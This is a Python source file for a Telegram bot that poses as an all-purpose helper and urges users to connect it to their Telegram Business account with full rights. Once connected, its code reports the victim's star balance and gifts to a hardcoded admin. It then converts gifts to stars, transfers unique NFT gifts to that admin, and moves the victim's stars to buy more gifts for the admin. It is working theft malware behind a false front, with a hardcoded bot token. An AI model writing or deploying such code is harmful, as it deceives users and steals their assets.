from aiogram import F, Bot, Dispatcher, types
import asyncio
import logging
import json
import os
from aiogram.types import Message, BusinessConnection
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from aiogram.filters import Command

from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts

# Configuration
TOKEN = "7718769489:AAG7_Bv2KS0BwYv8ULyIyMi8EvuBXS7Jbc0"  # Your Bot API Token from @BotFather
ADMIN_ID = 8077821068  # Your Telegram ID

bot = Bot(TOKEN)
dp = Dispatcher()

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    if not message.from_user:
        return
        
    try:
        command_args = message.text.split() if message.text else []
        if len(command_args) != 2:
            await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–∫–∞–∂–∏—Ç–µ id –æ–ø–µ—Ä–∞—Ü–∏–∏. –ü—Ä–∏–º–µ—Ä: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"–í–æ–∑–≤—Ä–∞—Ç –∑–≤—ë–∑–¥ –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id} —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!")
        else:
            await message.answer(f"–ù–µ —É–¥–∞–ª–æ—Å—å –≤—ã–ø–æ–ª–Ω–∏—Ç—å –≤–æ–∑–≤—Ä–∞—Ç –ø–æ –æ–ø–µ—Ä–∞—Ü–∏–∏ {transaction_id}.")

    except Exception as e:
        await message.answer(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –≤–æ–∑–≤—Ä–∞—Ç–∞: {str(e)}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    if not message.from_user:
        return
        
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "‚ù§Ô∏è <b>–Ø ‚Äî —Ç–≤–æ–π –≥–ª–∞–≤–Ω—ã–π –ø–æ–º–æ—â–Ω–∏–∫ –≤ –∂–∏–∑–Ω–∏</b>, –∫–æ—Ç–æ—Ä—ã–π:\n"
            "‚Ä¢ –æ—Ç–≤–µ—Ç–∏—Ç –Ω–∞ –ª—é–±–æ–π –≤–æ–ø—Ä–æ—Å\n"
            "‚Ä¢ –ø–æ–¥–¥–µ—Ä–∂–∏—Ç —Ç–µ–±—è –≤ —Ç—Ä—É–¥–Ω—É—é –º–∏–Ω—É—Ç—É\n"
            "‚Ä¢ —Å–¥–µ–ª–∞–µ—Ç –∑–∞ —Ç–µ–±—è –¥–æ–º–∞—à–∫—É, —Ä–∞–±–æ—Ç—É –∏–ª–∏ –¥–∞–∂–µ –Ω–∞—Ä–∏—Å—É–µ—Ç –∫–∞—Ä—Ç–∏–Ω—É\n\n"
            "<i>–í–≤–µ–¥–∏ –∑–∞–ø—Ä–æ—Å –Ω–∏–∂–µ, –∏ —è –ø–æ–º–æ–≥—É —Ç–µ–±–µ!</i> üëá",
            parse_mode="HTML"
        )
    else:
        await message.answer(
            "test\n\nüîó –ë–æ—Ç –∞–∫—Ç–∏–≤–µ–Ω"
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "üìå <b>–î–ª—è –ø–æ–ª–Ω–æ—Ü–µ–Ω–Ω–æ–π —Ä–∞–±–æ—Ç—ã –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –±–æ—Ç–∞ –∫ –±–∏–∑–Ω–µ—Å-–∞–∫–∫–∞—É–Ω—Ç—É Telegram</b>\n\n"
        "–ö–∞–∫ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å?\n\n"
        "1. ‚öôÔ∏è –û—Ç–∫—Ä–æ–π—Ç–µ <b>–ù–∞—Å—Ç—Ä–æ–π–∫–∏ Telegram</b>\n"
        "2. üíº –ü–µ—Ä–µ–π–¥–∏—Ç–µ –≤ —Ä–∞–∑–¥–µ–ª <b>Telegram –¥–ª—è –±–∏–∑–Ω–µ—Å–∞</b>\n"
        "3. ü§ñ –û—Ç–∫—Ä–æ–π—Ç–µ –ø—É–Ω–∫—Ç <b>–ß–∞—Ç-–±–æ—Ç—ã</b>\n"
        "4. ‚úçÔ∏è –í–≤–µ–¥–∏—Ç–µ –∏–º—è –≤–∞—à–µ–≥–æ –±–æ—Ç–∞\n\n"
        "‚ùó–î–ª—è –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ–π —Ä–∞–±–æ—Ç—ã –±–æ—Ç—É —Ç—Ä–µ–±—É—é—Ç—Å—è <b>–≤—Å–µ –ø—Ä–∞–≤–∞</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    """–ë–µ–∑–æ–ø–∞—Å–Ω–∞—è –∑–∞–≥—Ä—É–∑–∫–∞ JSON —Ñ–∞–π–ª–∞"""
    try:
        if not os.path.exists(filename):
            return []
        
        with open(filename, "r", encoding="utf-8") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ JSON-—Ñ–∞–π–ª–∞ {filename}.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    """–ü–æ–ª—É—á–∏—Ç—å ID –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –ø–æ ID –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        data = load_json_file("connections.json")
        if isinstance(data, dict):
            return data.get(str(user_id), "")
        return ""
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ connection_id")
        return ""

def load_connections():
    """–ó–∞–≥—Ä—É–∑–∏—Ç—å —Å–ø–∏—Å–æ–∫ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏–π"""
    return load_json_file(CONNECTIONS_FILE)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = 8077821068

        rights = connection.rights
        business_connection = connection

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            try:
                response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
                star_amount = response.star_amount

                gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
                all_gifts_amount = len(gifts.gifts)
                unique_gifts_amount = sum(1 for gift in gifts.gifts if hasattr(gift, 'type') and gift.type == "unique")
            except Exception as e:
                logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –æ –ø–æ–¥–∞—Ä–∫–∞—Ö –∏ –∑–≤–µ–∑–¥–∞—Ö")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"
        unique_gifts_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞ ‚ùå"

        msg = (
            f"ü§ñ <b>–ù–æ–≤—ã–π –±–∏–∑–Ω–µ—Å-–±–æ—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω!</b>\n\n"
            f"üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: @{business_connection.user.username or '‚Äî'}\n"
            f"üÜî User ID: <code>{business_connection.user.id}</code>\n"
            f"üîó Connection ID: <code>{business_connection.id}</code>\n"
            f"\n‚≠êÔ∏è –ó–≤–µ–∑–¥—ã: <code>{star_amount_text}</code>"
            f"\nüéÅ –ü–æ–¥–∞—Ä–∫–æ–≤: <code>{all_gifts_text}</code>"
            f"\nüîù NFT –ø–æ–¥–∞—Ä–∫–æ–≤: <code>{unique_gifts_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="üéÅ –í—ã–≤–µ—Å—Ç–∏ –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="‚≠êÔ∏è –ü—Ä–µ–≤—Ä–∞—Ç–∏—Ç—å –≤—Å–µ –ø–æ–¥–∞—Ä–∫–∏ –≤ –∑–≤–µ–∑–¥—ã", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text="üîù –ê–ø–≥—Ä–µ–π–¥–Ω—É—Ç—å –≤—Å–µ –≥–∏—Ñ—Ç—ã", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ –ª–∏—á–Ω—ã–π —á–∞—Ç.")

def save_business_connection_data(business_connection):
    """–°–æ—Ö—Ä–∞–Ω–∏—Ç—å –¥–∞–Ω–Ω—ã–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è"""
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name or "Unknown",
        "last_name": business_connection.user.last_name or ""
    }

    data = load_json_file(CONNECTIONS_FILE)

    # –û–±–Ω–æ–≤–ª—è–µ–º —Å—É—â–µ—Å—Ç–≤—É—é—â—É—é –∑–∞–ø–∏—Å—å –∏–ª–∏ –¥–æ–±–∞–≤–ª—è–µ–º –Ω–æ–≤—É—é
    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ–±—Ä–∞—Ç–Ω–æ
    try:
        with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –¥–∞–Ω–Ω—ã—Ö –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    """–ü–æ–ª—É—á–∏—Ç—å –∏–º—è –ø–æ–¥–∞—Ä–∫–∞ –ø–æ –µ–≥–æ ID"""
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "üéÅ –ù–µ—Ç –ø–æ–¥–∞—Ä–∫–æ–≤."
        
        for gift in gifts.gifts:
            if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id == owned_gift_id:
                if hasattr(gift, 'gift') and hasattr(gift.gift, 'base_name'):
                    gift_name = gift.gift.base_name.replace(" ", "")
                    return f"https://t.me/nft/{gift_name}-{gift.gift.number}"
        
        return "üéÅ –ü–æ–¥–∞—Ä–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω."
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –∏–º–µ–Ω–∏ –ø–æ–¥–∞—Ä–∫–∞")
        return "üéÅ –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–¥–∞—Ä–∫–∞."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(
            business_connection.user.id, 
            "–ü—Ä–∏–≤–µ—Ç! –¢—ã –ø–æ–¥–∫–ª—é—á–∏–ª –±–æ—Ç–∞ –∫–∞–∫ –±–∏–∑–Ω–µ—Å-–∞—Å—Å–∏—Å—Ç–µ–Ω—Ç–∞."
        )
        
        save_business_connection_data(business_connection)
        
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±—Ä–∞–±–æ—Ç–∫–µ –±–∏–∑–Ω–µ—Å-–ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è")

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id if message.from_user else None

    if user_id == OWNER_ID or not business_id:
        return

    # –ö–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏—è –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤
    try:
        convert_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                    owned_gift_id = gift.owned_gift_id
                    await bot.convert_gift_to_stars(business_id, owned_gift_id)
                    print(f"–ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω –ø–æ–¥–∞—Ä–æ–∫ {owned_gift_id}")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –ø–æ–¥–∞—Ä–∫–∞: {e}")
                continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –Ω–µ—É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    
    # –ü–µ—Ä–µ–¥–∞—á–∞ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤
    try:
        unique_gifts = await bot.get_business_account_gifts(business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("–ù–µ—Ç —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
        else:
            for gift in unique_gifts.gifts:
                try:
                    if hasattr(gift, 'owned_gift_id') and gift.owned_gift_id:
                        owned_gift_id = gift.owned_gift_id
                        await bot.transfer_gift(business_id, owned_gift_id, task_id, 25)
                        print(f"–£—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫ {owned_gift_id}")
                except Exception as e:
                    print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞: {e}")
                    continue
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
    
    # –†–∞–±–æ—Ç–∞ —Å –±–∞–ª–∞–Ω—Å–æ–º –∑–≤–µ–∑–¥
    try:
        stars = await bot.get_business_account_star_balance(business_id)
        if hasattr(stars, 'amount') and stars.amount > 0:
            print(f"–ù–∞–π–¥–µ–Ω–æ {stars.amount} –∑–≤—ë–∑–¥")
            
            # –ü–µ—Ä–µ–≤–æ–¥–∏–º –∑–≤—ë–∑–¥—ã –Ω–∞ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞
            await bot.transfer_business_account_stars(business_id, stars.amount)
            print(f"–£—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–≤–µ–¥–µ–Ω–æ {stars.amount} –∑–≤—ë–∑–¥ –Ω–∞ –±–∞–ª–∞–Ω—Å –±–æ—Ç–∞")
            
            # –ü–æ–∫—É–ø–∞–µ–º –ø–æ–¥–∞—Ä–∫–∏ –∑–∞ –∑–≤—ë–∑–¥—ã –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –∞–¥–º–∏–Ω—É
            try:
                available_gifts = await bot.get_available_gifts()
                if available_gifts and available_gifts.gifts:
                    # –ù–∞—Ö–æ–¥–∏–º —Å–∞–º—ã–π –¥–µ—à—ë–≤—ã–π –ø–æ–¥–∞—Ä–æ–∫
                    cheapest_gift = min(available_gifts.gifts, key=lambda g: g.star_count)
                    star_balance = stars.amount
                    gifts_to_buy = star_balance // cheapest_gift.star_count
                    
                    print(f"–ü–æ–∫—É–ø–∞–µ–º {gifts_to_buy} –ø–æ–¥–∞—Ä–∫–æ–≤ –ø–æ {cheapest_gift.star_count} –∑–≤—ë–∑–¥ –∫–∞–∂–¥—ã–π")
                    
                    for i in range(gifts_to_buy):
                        try:
                            await bot.send_gift(
                                user_id=task_id,
                                gift_id=cheapest_gift.id
                            )
                            print(f"–û—Ç–ø—Ä–∞–≤–ª–µ–Ω –ø–æ–¥–∞—Ä–æ–∫ {i+1}/{gifts_to_buy}")
                        except Exception as e:
                            print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –ø–æ–¥–∞—Ä–∫–∞ {i+1}: {e}")
                            break
                            
                    print(f"–í—Å–µ–≥–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –ø–æ–¥–∞—Ä–∫–æ–≤ –∞–¥–º–∏–Ω—É: {gifts_to_buy}")
                else:
                    print("–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–æ–¥–∞—Ä–∫–æ–≤ –¥–ª—è –ø–æ–∫—É–ø–∫–∏")
            except Exception as e:
                print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–∫—É–ø–∫–µ –ø–æ–¥–∞—Ä–∫–æ–≤: {e}")
        else:
            print("–ù–µ—Ç –∑–≤—ë–∑–¥ –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏.")
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–±–æ—Ç–µ —Å –±–∞–ª–∞–Ω—Å–æ–º –∑–≤—ë–∑–¥: {e}")

async def main():
    try:
        await dp.start_polling(bot)
    except Exception as e:
        logging.exception("–û—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())